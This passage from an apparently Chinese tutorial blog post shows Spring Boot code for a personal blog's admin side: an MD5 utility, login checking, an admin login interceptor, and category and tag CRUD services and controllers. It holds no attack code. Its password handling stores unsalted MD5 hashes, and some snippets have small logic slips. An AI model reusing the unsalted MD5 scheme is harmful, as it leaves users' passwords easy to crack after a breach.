java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  MD5加密类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@parm</span> str 要加密的字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 加密后的字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MD5Utils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">code</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest md = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            md.update(str.getBytes());</span><br><span class="line">            <span class="keyword">byte</span>[] bytesDigest = md.digest();</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            StringBuffer buffer = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> offset = <span class="number">0</span>;offset&lt;bytesDigest.length;offset++)&#123;</span><br><span class="line">                i = bytesDigest[offset];</span><br><span class="line">                <span class="keyword">if</span> (i&lt;<span class="number">0</span>)</span><br><span class="line">                    i+= <span class="number">256</span>;</span><br><span class="line">                <span class="keyword">if</span> (i&lt;<span class="number">16</span>)</span><br><span class="line">                    buffer.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">                buffer.append(Integer.toHexString(i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//32位加密</span></span><br><span class="line">            <span class="keyword">return</span> buffer.toString();</span><br><span class="line">            <span class="comment">//16位加密</span></span><br><span class="line">            <span class="comment">//return buffer.toString().substring(8,20);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//加密测试Main方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(code(<span class="string">&quot;123456789&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.UserRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MD5Utils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">checkUser</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        User user = userRepository.findByUsernameAndPassword(username, MD5Utils.code(password));</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogController.java 博客后台页面权限过滤管理类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web.admin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blogs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blogs&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LongInterceptor.java Blog后台页面权限(登录过滤)类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongInterceptor</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//WebMvcConfigurerAdapter这个也过时了</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>) == <span class="keyword">null</span>)&#123;</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;/admin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WebConfig.java Blog后台页面权限(拦截配置)类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.interceptor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//WebMvcConfigurerAdapter这个过时了</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> LongInterceptor()).addPathPatterns(<span class="string">&quot;/admin/**&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/admin/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关于弃用类整改"><a href="#关于弃用类整改" class="headerlink" title="关于弃用类整改"></a>关于弃用类整改</h3><p>LongInterceptor.java Blog后台页面权限(登录过滤)类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>) == <span class="keyword">null</span>)&#123;</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;/admin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WebConfig.java Blog后台页面权限(拦截配置)类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.interceptor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> LongInterceptor()).addPathPatterns(<span class="string">&quot;/admin/**&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/admin/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分类业务处理"><a href="#分类业务处理" class="headerlink" title="分类业务处理"></a>分类业务处理</h3><p>TypeService.java 分类业务逻辑处理接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TypeService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">saveType</span><span class="params">(Type type)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">getType</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">getTypeByName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Type&gt; <span class="title">listType</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Type&gt; <span class="title">listType</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">updateType</span><span class="params">(Long id,Type type)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteType</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TypeServiceImpl.java 分类业务逻辑处理实现类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.TypeRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeServiceImpl</span> <span class="keyword">implements</span> <span class="title">TypeService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeRepository typeRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">saveType</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.save(type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getTypeByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findByName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Type&gt; <span class="title">listType</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Type&gt; <span class="title">listType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">updateType</span><span class="params">(Long id, Type type)</span> </span>&#123;</span><br><span class="line">        Type t = typeRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;您查找的信息不存在(︶︹︺)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(type,t);</span><br><span class="line">        <span class="keyword">return</span> typeRepository.save(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteType</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        typeRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TypeRepository.java 分类业务 SQL操作接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TypeRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Type</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">findByName</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TypeController.java Web层操作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web.admin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.BindingResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.support.RedirectAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeService typeService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/types&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">types</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;id&quot;&#125;,direction = Sort.Direction.DESC)</span></span></span></span><br><span class="line"><span class="params"><span class="function">                                Pageable pageable, Model model)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,typeService.listType(pageable));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/admin/types&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/types/input&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">input</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;type&quot;</span>,<span class="keyword">new</span> Type());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/admin/types-input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;types/&#123;id&#125;/input&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">editInput</span><span class="params">(<span class="meta">@PathVariable</span> Long id, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;type&quot;</span>,typeService.getType(id));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/admin/types-input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/types&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">(<span class="meta">@Valid</span> Type type, BindingResult result, RedirectAttributes attributes)</span></span>&#123;</span><br><span class="line">        Type typename = typeService.getTypeByName(type.getName());</span><br><span class="line">        <span class="keyword">if</span> (typename != <span class="keyword">null</span>)&#123;</span><br><span class="line">            result.rejectValue(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;nameError&quot;</span>,<span class="string">&quot;管理员大大，这个分类已经有了。((٩(//̀Д/́/)۶))做人要专一哦！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result.hasErrors())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/admin/types-input&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Type t =  typeService.saveType(type);</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;新增失败 ﾍ(;´Д｀ﾍ),管理员大大重新试下吧&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;新增成功 ≖‿≖✧ 快去发布新内容吧&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:../admin/types&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/types/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">editPost</span><span class="params">(<span class="meta">@Valid</span> Type type, BindingResult result,<span class="meta">@PathVariable</span> Long id, RedirectAttributes attributes)</span></span>&#123;</span><br><span class="line">        Type typename = typeService.getTypeByName(type.getName());</span><br><span class="line">        <span class="keyword">if</span> (typename != <span class="keyword">null</span>)&#123;</span><br><span class="line">            result.rejectValue(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;nameError&quot;</span>,<span class="string">&quot;管理员大大，这个分类已经有了。((٩(//̀Д/́/)۶))做人要专一哦！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result.hasErrors())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/admin/types-input&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Type t =  typeService.updateType(id,type);</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;更新失败（⊙o⊙）,管理员大大重新试下吧&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;更新成功 (≥◇≤) 快去发布新内容吧&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:../types&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/types/&#123;id&#125;/delete&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">delete</span><span class="params">(<span class="meta">@PathVariable</span> Long id,RedirectAttributes attributes)</span></span>&#123;</span><br><span class="line">        typeService.deleteType(id);</span><br><span class="line">        attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;删除成功,可能是管理员大大不喜欢它了吧(.◕ฺˇд ˇ◕ฺ)&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:../&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="标签业务处理"><a href="#标签业务处理" class="headerlink" title="标签业务处理"></a>标签业务处理</h3><p>TagService.java 标签业务逻辑处理接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TagService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">saveTag</span><span class="params">(Tag tag)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">getTag</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">getTagByName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Tag&gt; <span class="title">listTag</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Tag&gt; <span class="title">listTag</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Tag&gt; <span class="title">listTag</span><span class="params">(String ids)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">updateTag</span><span class="params">(Long id,Tag tag)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteTag</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TagServiceImpl.java 标签业务逻辑处理实现类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.TagRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span 